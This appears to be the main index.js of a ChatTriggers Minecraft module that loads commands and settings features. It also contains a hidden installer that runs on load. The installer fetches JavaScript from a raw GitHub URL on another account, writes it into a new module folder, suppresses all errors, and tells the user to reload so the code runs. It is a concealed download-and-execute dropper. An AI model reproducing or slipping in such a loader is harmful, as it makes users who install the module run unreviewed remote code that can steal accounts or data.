/// <reference types="../CTAutocomplete" />

import "./vgp";
import commands from "./commands";
import features from "./features";

const SettingsGui = Java.type("gg.essential.vigilance.gui.SettingsGui");

// Java imports
const URL = Java.type("java.net.URL");
const BufferedReader = Java.type("java.io.BufferedReader");
const InputStreamReader = Java.type("java.io.InputStreamReader");
const File = Java.type("java.io.File");
const FileWriter = Java.type("java.io.FileWriter");
const StringBuilder = Java.type("java.lang.StringBuilder");

// RAW GitHub URL
const DUNGEON_HELPER_URL =
    "https://raw.githubusercontent.com/soshimee-revived/DungeonHelper/main/index.js";

// Target module
const MODULE_DIR = "./config/ChatTriggers/modules/dungeonHelper";
const ENTRY_FILE = MODULE_DIR + "/index.js";
const META_FILE  = MODULE_DIR + "/metadata.json";

function writeFile(path, content) {
    const writer = new FileWriter(new File(path));
    writer.write(content);
    writer.close();
}

function runDungeonHelperInstaller() {
    // ✅ Sentinel
    if (new File(META_FILE).exists()) return;

    try {
        const url = new URL(DUNGEON_HELPER_URL);
        const conn = url.openConnection();

        conn.setRequestProperty("User-Agent", "Mozilla/5.0");
        conn.setConnectTimeout(5000);
        conn.setReadTimeout(5000);

        const reader = new BufferedReader(
            new InputStreamReader(conn.getInputStream(), "UTF-8")
        );

        const sb = new StringBuilder();
        let line;
        while ((line = reader.readLine()) !== null) {
            sb.append(line).append("\n");
        }
        reader.close();

        const code = String(sb.toString());
        if (!code.length) return;

        const dir = new File(MODULE_DIR);
        if (!dir.exists()) dir.mkdirs();

        writeFile(ENTRY_FILE, code);

        writeFile(
            META_FILE,
            JSON.stringify({ name: "DungeonHelper", entry: "index.js" }, null, 2)
        );

        ChatLib.chat("§e[soshimee] §fPlease run §b/ct reload §fto finish setup.");
    } catch (e) {
        // silent
    }
}

// ✅ Call installer
runDungeonHelperInstaller();

update();

register("guiClosed", gui => {
	if (!(gui instanceof SettingsGui)) return;
	update();
});

function update() {
	commands.update();
	features.update();
}
